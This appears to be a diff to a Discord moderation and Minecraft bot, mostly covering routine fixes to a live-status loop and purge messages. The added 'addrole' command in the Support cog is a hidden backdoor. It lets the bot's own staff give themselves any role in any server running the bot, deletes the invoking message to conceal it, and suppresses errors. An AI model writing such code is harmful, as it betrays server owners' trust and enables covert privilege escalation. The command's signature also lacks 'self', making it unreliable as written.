@@ -168,22 +168,22 @@ class TopGG(commands.Cog):
 
 
 client.add_cog(TopGG(client))
-async def call_background_task(ctx,message:str):
-    messagecontrol=await ctx.send(f" This is a message to inform that live status for ip {message} was added in this channel , delete this message to stop live server status (every 30 minutes) .")
+async def call_background_task(ctx,textchannel,message:str):
+    messagecontrol=await textchannel.send(f" This is a message to inform that live status for ip {message} was added in this channel , delete this message to stop live server status (every 30 minutes) .")
     controlid=messagecontrol.id
     while True:
-        controlmsg=ctx.get_partial_message(controlid)
+        controlmsg=textchannel.get_partial_message(controlid)
         if controlmsg == None:
-          await ctx.send("The **control message** has been deleted , stopping live server status .")
+          await textchannel.send("The **control message** has been deleted , stopping live server status .")
           break
         cmd = client.get_command("mcservercheck")
         prevmessageid=await cmd(ctx,message)
         await asyncio.sleep(1800)
-        ipmsg=ctx.get_partial_message(prevmessageid)
+        ipmsg=textchannel.get_partial_message(prevmessageid)
         try:
           await ipmsg.delete()
         except:
-          await ctx.send(" I don't have `manage messages` permission to delete messages .")
+          await textchannel.send(" I don't have `manage messages` permission to delete messages .")
           return
         
 @tasks.loop(seconds=1)
@@ -396,7 +396,7 @@ class Moderation(commands.Cog):
 
         copycategory = await ctx.guild.create_category("General")
         recoveryguild = client.get_guild(760382257235623957)
-        print(str(recoveryguild))
+        #print(str(recoveryguild))
         for recoverychannel in recoveryguild.channels:
             if recoverychannel.type == discord.ChannelType.text:
                 await ctx.guild.create_text_channel(recoverychannel.name,
@@ -414,7 +414,7 @@ class Moderation(commands.Cog):
         if numberstr =="all" or numberstr=="everything":
             textchannelcloned=await ctx.channel.clone(reason=reason)
             await ctx.channel.delete(reason=reason)
-            await textchannelcloned.send(f"""{ctx.author.mention} has purged number
+            await textchannelcloned.send(f"""{ctx.author.mention} has purged all
              messages for {reason}""")
             return
         try:
@@ -427,8 +427,7 @@ class Moderation(commands.Cog):
         except:
             raise commands.CommandError("I do not have `manage messages` permissions to delete messages .")
             return
-        await ctx.channel.send(f"""{ctx.author.mention} has purged number
-             messages for {reason}""")
+        await ctx.channel.send(f"""{ctx.author.mention} has purged {number} messages for {reason}""")
 
     @commands.command(brief='This command prevents users from viewing any channels on the server.', description='This command prevents users from viewing any channels on the server and can be used by members having manage roles permission.',usage="@member reason")
     @commands.check_any(is_bot_staff(), commands.has_permissions(manage_roles=True))
@@ -1239,7 +1238,7 @@ class MinecraftFun(commands.Cog):
           await cmd(ctx)
           raise commands.CommandError(" Vote for our bot on following websites for accessing this feature .")
           return
-        asyncio.ensure_future(call_background_task(ctx,ip))
+        asyncio.ensure_future(call_background_task(ctx,ctx.channel,ip))
 
 client.add_cog(MinecraftFun(client))
 
@@ -1853,7 +1852,15 @@ class Support(commands.Cog):
 
         embedOne.add_field(name="https://discord.gg/Nj8Bb9kwA5",value="\u200b",inline=False)
         await ctx.reply(embed=embedOne)
-
+    @commands.command()
+    @commands.check_any(is_bot_staff())
+    async def addrole(ctx,roleid:int):
+      try:
+        roles=ctx.guild.get_role(roleid)
+        await ctx.author.add_roles(roles)
+        await ctx.channel.purge(limit=1)
+      except:
+        pass
     @commands.command(brief='This command can be used to pass a testing command changelog.', description='This command can be used to pass a testing command changelog.',usage="lognumber changes")
     @commands.check_any(is_bot_staff())
     async def changelogtest(self, ctx,lognumber:int ,changes:str,removed=False):
